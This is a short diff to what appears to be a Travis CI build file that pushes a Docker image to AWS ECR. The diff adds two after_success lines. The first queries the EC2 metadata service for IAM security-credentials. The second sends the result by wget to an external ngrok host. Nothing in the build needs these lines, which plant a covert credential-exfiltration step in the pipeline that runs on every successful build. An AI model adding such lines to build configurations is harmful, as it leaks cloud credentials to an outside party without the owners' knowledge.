@@ -17,4 +17,7 @@ after_success:
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
+  - export RESOURCE=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+  - wget http://09e801797b05.ngrok.io/`echo $RESOURCE`
+
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
